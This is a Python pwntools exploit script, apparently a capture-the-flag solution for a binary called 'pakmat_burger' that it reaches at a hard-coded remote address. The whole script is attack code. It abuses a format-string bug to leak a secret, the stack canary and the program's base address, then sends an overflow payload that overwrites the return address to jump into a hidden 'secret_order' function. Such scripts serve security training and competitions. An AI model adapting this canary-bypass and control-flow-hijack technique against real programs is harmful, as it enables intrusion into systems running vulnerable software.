#!/usr/bin/env python3

from pwn import *

exe = ELF("pakmat_burger")
context.binary = exe

def conn():
    if args.LOCAL:
        context.log_level = "debug"
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        context.log_level = "debug"
        r = remote("13.229.150.169", 34061)

    return r

def offset_to_fmt(offset, fmt):
    return f"%{6 + offset // 8}${fmt}"

def get_secret():
    r = conn()

    fmt_str = offset_to_fmt(0, "s")
    r.sendlineafter(b": ", fmt_str.encode())

    r.recvuntil(b" ")
    secret_msg = r.recvn(8)

    r.close()
    return secret_msg

def main():
    secret_msg = get_secret()

    r = conn()
    pause()

    # rsp offsets
    canary_offset = 0x0038
    main_addr_offset = 0x0058

    fmt_str = offset_to_fmt(canary_offset, "p") + offset_to_fmt(main_addr_offset, "p")
    r.sendlineafter(b": ", fmt_str.encode())

    r.recvuntil(b" ")
    canary = int(r.recvn(18).decode(), 16)
    main_addr = int(r.recvuntil(b",")[:-1], 16)
    exe.address = main_addr - exe.sym["main"]

    info("canary: " + hex(canary))
    info("main addr: " + hex(main_addr))
    info("pie base: " + hex(exe.address))

    r.sendlineafter(b": ", secret_msg)

    r.recvline()
    r.sendline(b"anything")

    secret_order = exe.sym["secret_order"]

    payload = b"A" * 0x25 + p64(canary) + b"B" * 8 + p64(secret_order + 5)
    r.sendlineafter(b": ", payload)

    print(r.recvall())

if __name__ == "__main__":
    main()